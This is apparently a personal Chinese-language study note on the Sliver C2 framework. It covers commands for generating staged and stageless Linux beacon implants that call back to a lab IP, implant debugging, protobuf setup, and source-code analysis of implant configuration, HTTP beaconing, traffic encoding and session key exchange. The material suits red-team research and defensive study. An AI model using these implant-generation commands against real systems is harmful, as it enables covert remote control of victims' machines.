# 常用命令

无阶段木马生成

    generate beacon --http http://192.168.182.131:8080 --os linux --arch amd64 --debug --debug-file sliver.log
    
    generate beacon --mtls 192.168.182.131:8080 --os linux --arch amd64 --debug --debug-file sliver.log --jitter 2 --seconds 5

阶段木马生成

    profiles new beacon linux_beacon --http  http://192.168.182.131:8080 --format exe  --os linux
    
    stage-listener --url  tcp://192.168.182.131:8088 --profile linux_beacon 
    
    generate msf-stager --lport 8088 --lhost 192.168.182.131 --arch amd64 --os linux

# 调试

### implant

```
生成debug版本的 implant

./implant

ps -aux | grep implant

/home/john/go/bin/dlv attach 2277286 --api-version 2 --headless --listen 127.0.0.1:1234 
```

可以直接去.sliver 文件中的render后的代码编译，然后调试

编译命令

```
ohn@john-machine ~/.team-server/slivers/linux/amd64/ADEQUATE_OSTRICH/src/github.com/bishopfox/sliver$ go build -gcflags="all=-N -l" .     
```

# golang protobuf 配置

先安装protobuf编译器protoc

从 Protobuf Releases（<https://github.com/protocolbuffers/protobuf/releases）> 下载最先版本的发布包安装。如果是 Ubuntu，可以按照如下步骤操作（以3.11.2为例）。

    # 下载安装包
    $ wget https://github.com/protocolbuffers/protobuf/releases/download/v3.11.2/protoc-3.11.2-linux-x86_64.zip
    # 解压到 /usr/local 目录下
    $ sudo 7z x protoc-3.11.2-linux-x86_64.zip -o/usr/local

如果能正常显示版本，则表示安装成功。

    $ protoc --version
    libprotoc 3.11.2

在安装protoc-gen-go（是go版本的 Protobuf 编译器插件）

    go install github.com/golang/protobuf/protoc-gen-go@latest

protoc-gen-go 将自动安装到 \$GOPATH/bin 目录下

简单的proto文件

```proto
syntax = "proto3";
package main;

option go_package = "./";

// this is a comment
message Student {
  string name = 1;
  bool male = 2;
  repeated int32 scores = 3;
}
```

运行

    protoc --go_out=. *.proto

将其编译成go文件

# implant代码分析

### implant配置结构

```go
type ImplantConfig struct {
	ID               uuid.UUID `gorm:"primaryKey;->;<-:create;type:uuid;"`
	ImplantBuildID   uuid.UUID
	ImplantProfileID uuid.UUID

	CreatedAt time.Time `gorm:"->;<-:create;"`

	// Go
	GOOS   string
	GOARCH string

	TemplateName string

	IsBeacon       bool
	BeaconInterval int64
	BeaconJitter   int64

	// ECC
	ECCPublicKey            string
	ECCPublicKeyDigest      string
	ECCPrivateKey           string
	ECCPublicKeySignature   string
	ECCServerPublicKey      string
	MinisignServerPublicKey string

	// MTLS
	MtlsCACert string
	MtlsCert   string
	MtlsKey    string

	Debug               bool
	DebugFile           string
	Evasion             bool
	ObfuscateSymbols    bool
	ReconnectInterval   int64
	MaxConnectionErrors uint32
	ConnectionStrategy  string

	// WireGuard
	WGImplantPrivKey  string
	WGServerPubKey    string
	WGPeerTunIP       string
	WGKeyExchangePort uint32
	WGTcpCommsPort    uint32

	C2 []ImplantC2

	MTLSc2Enabled bool
	WGc2Enabled   bool
	HTTPc2Enabled bool
	DNSc2Enabled  bool

	CanaryDomains     []CanaryDomain
	NamePipec2Enabled bool
	TCPPivotc2Enabled bool

	// Limits
	LimitDomainJoined bool
	LimitHostname     string
	LimitUsername     string
	LimitDatetime     string
	LimitFileExists   string
	LimitLocale       string

	// Output Format
	Format clientpb.OutputFormat

	// For 	IsSharedLib bool
	IsSharedLib bool
	IsService   bool
	IsShellcode bool

	RunAtLoad bool

	FileName string
}
```

### 网络封装过程

Beacon 结构体

```golang

// Beacon - Abstract connection to the server
type Beacon struct {
	Init    BeaconInit
	Start   BeaconStart
	Send    BeaconSend
	Recv    BeaconRecv
	Close   BeaconClose
	Cleanup BeaconCleanup

	ActiveC2 string
	ProxyURL string
}

```

SliverHTTPClient 结构体

```golang
type SliverHTTPClient struct {
	Origin      string
	PathPrefix  string
	driver      HTTPDriver
	ProxyURL    string
	SessionCtx  *cryptography.CipherContext
	SessionID   string
	pollTimeout time.Duration
	pollCancel  context.CancelFunc
	pollMutex   *sync.Mutex
	Closed      bool

	Options *HTTPOptions
}

```

启动流程：

beaconStartup --> StartBeaconLoop --> beaconMainLoop --> beaconMain

### 随机加密原理

```go
// RandomEncoder - Get a random nonce identifier and a matching encoder
func RandomEncoder() (int, Encoder) {
	keys := make([]int, 0, len(EncoderMap))
	for k := range EncoderMap {
		keys = append(keys, k)
	}
	encoderID := keys[insecureRand.Intn(len(keys))]
	nonce := (insecureRand.Intn(maxN) * EncoderModulus) + encoderID
	return nonce, EncoderMap[encoderID]
}
```

```go
var nonceQueryArgs    = "abcdefghijklmnopqrstuvwxyz_"

// NonceQueryArgument - Adds a nonce query argument to the URL
func (s *SliverHTTPClient) NonceQueryArgument(uri *url.URL, value int) *url.URL {
	values := uri.Query()
	key := nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))]
	argValue := fmt.Sprintf("%d", value)
	for i := 0; i < insecureRand.Intn(3); i++ {
		index := insecureRand.Intn(len(argValue))
		char := string(nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))])
		argValue = argValue[:index] + char + argValue[index:]
	}
	values.Add(string(key), argValue)
	uri.RawQuery = values.Encode()
	return uri
}
```

```go
nonce, encoder := encoders.RandomEncoder()
s.NonceQueryArgument(uri, nonce)
req := s.newHTTPRequest(http.MethodGet, uri, nil)
```

通过RandomEncoder 生成随机的 encoderID ， 然后使用encoderID选择一个加密方法，再根据encoderID 生成 nonce ， nonce 通过http请求参数发送给服务器，告知服务器加解密方法。

nonce 的生成为 encoderID + 一个随机数\*EncoderModulus

http请求参数的生成为：key从nonceQueryArgs选一个字符，value为：nonce中插入nonceQueryArgs中的随机字符

### http请求分析

*   初始化连接：HTTPStartSession

    首先通过httpClient初始化地址信息与选择http driver，然后调用SessionInit，进行密钥交换。其中会通过startSessionURL函数（用户可通过配置，进行动态配置）生成随机path，加上特定的用于初始化连接的后缀（eg\:html）, 对应的配置选项为:
    .HTTPC2ImplantConfig.SessionFileExt
    .HTTPC2ImplantConfig.StartSessionFileExt 等

*   获取请求：ReadEnvelope

    会调用pollURL，随机生成path然后加上特定后缀（eg\:js）,然后调用DoPoll（可以重点看一下，涉及到context、与锁）函数，获取服务器上的任务

*   返回结果：WriteEnvelope

    调用sessionURL获取特定的url，然后请求

*   关闭连接：CloseSession

    获取SliverHTTPClient中的pollMutex（ReadEnvelope中的DoPoll会上锁），调用context的cancel函数，通过closeURL获取关闭连接时请求的url

# server代码分析（http）

### implant可配置原理

在renderSliverGoCode函数中，利用text/template库，配置implant

### implant交互函数

http.go 中的 router函数

```go
	// Start Session Handler
	router.HandleFunc(
		fmt.Sprintf("/{rpath:.*\\.%s$}", c2Config.ImplantConfig.StartSessionFileExt),
		s.startSessionHandler,
	).MatcherFunc(s.filterOTP).MatcherFunc(s.filterNonce).Methods(http.MethodGet, http.MethodPost)

	// Session Handler
	router.HandleFunc(
		fmt.Sprintf("/{rpath:.*\\.%s$}", c2Config.ImplantConfig.SessionFileExt),
		s.sessionHandler,
	).MatcherFunc(s.filterNonce).Methods(http.MethodGet, http.MethodPost)

	// Poll Handler
	router.HandleFunc(
		fmt.Sprintf("/{rpath:.*\\.%s$}", c2Config.ImplantConfig.PollFileExt),
		s.pollHandler,
	).MatcherFunc(s.filterNonce).Methods(http.MethodGet)

	// Close Handler
	router.HandleFunc(
		fmt.Sprintf("/{rpath:.*\\.%s$}", c2Config.ImplantConfig.CloseFileExt),
		s.closeHandler,
	).MatcherFunc(s.filterNonce).Methods(http.MethodGet)

```

### 接受implant注册函数分析

http.go: startSessionHandler 函数

从接受的数据中(假定为data)，提取前32（data\[:32]）字节，获取publicKeyDigest，根据publicKeyDigest从数据库中获取implantConfig

获取服务器的ECC private key（serverPrivateKey） ， 与 implantConfig 中的 ECC private key（implantPrivateKey）。利用serverPrivateKey 解密 data\[32:] 的到 plaintext，然后利用implantPrivateKey计算plaintext\[sha256Size:]的摘要，并与 plaintext\[:sha256Size] 比较，相等则返回 plaintext\[sha256Size:] ， 也就是key，用于后续数据的加解密

然后利用newHTTPSession，创建一个sessionID，然后加密返回sessionID，且也利用http.SetCookie 设置 sessionID

后续连接通过 cookie 获取 sessionID

### implant 生成

StartBuilder - main entry point for the builder

GenerateConfig

### 新加命令与功能方法

sliver 使用 cobra 库 添加新的 执行选项 如

```go
var versionCmd = &cobra.Command{
	Use:   "version",
	Short: "Print version and exit",
	Long:  ``,
	Run: func(cmd *cobra.Command, args []string) {
		fmt.Printf("%s\n", version.FullVersion())
	},
}
```

对应

```shell
r1ng0@r1ng0-virtual-machine ~/Work/sliver$ ./sliver-server version                                                                          v1.5.41 
v1.5.41 - f2a3915c79b31ab31c0c2f0428bbd53d9e93c54b

```

sliver 使用 Grumble 来编写与用户交互的shell，关键代码为：

```go
clientconsole.Start(localRPC, command.BindCommands, serverOnlyCmds, true)
```

其中  command.BindCommands  与 serverOnlyCmds 用于向localRPC添加命令，

如果需要自定义可以使用它们

# 数据库操作

在构建implant时，会调用ImplantConfigSave，会将implant的配置信息写入implant\_configs数据表中

也会将生成好的implant 的md5Hash, sha1Hash, sha256Hash写入数据表 implantBuild 中。

上线流程：从数据包中提取publicKeyDigest，在查询数据表implant\_config获取implant的配置信息，获取私钥解密数据包，获取key，用于后续加密

# SliverC2 Stager

# 资料

Go Protobuf 简明教程

<https://geektutu.com/post/quick-go-protobuf.html>

go标准库的学习-text/template

<https://www.cnblogs.com/wanghui-garcia/p/10385062.html>

gorilla/mux

<https://pkg.go.dev/github.com/gorilla/mux#section-readme>

gRPC 官方文档中文版

<https://grpc.mydoc.io/?v=10467&t=58008>

GORM模型定义

<https://www.tizi365.com/archives/8.html>

Go 语言编程 — gorm 数据库版本迁移

<https://blog.csdn.net/Jmilk/article/details/108967581>

cobra

<https://pkg.go.dev/github.com/spf13/cobra>

Grumble - A powerful modern CLI and SHELL

<https://pkg.go.dev/github.com/desertbit/grumble#section-readme>

Writing a Sliver C2 Powershell Stager with Shellcode Compression and AES Encryption

<https://medium.com/@youcef.s.kelouaz/writing-a-sliver-c2-powershell-stager-with-shellcode-compression-and-aes-encryption-9725c0201ea8>

Learning Sliver C2 (06) - Stagers: Basics

<https://dominicbreuker.com/post/learning_sliver_c2_06_stagers/>
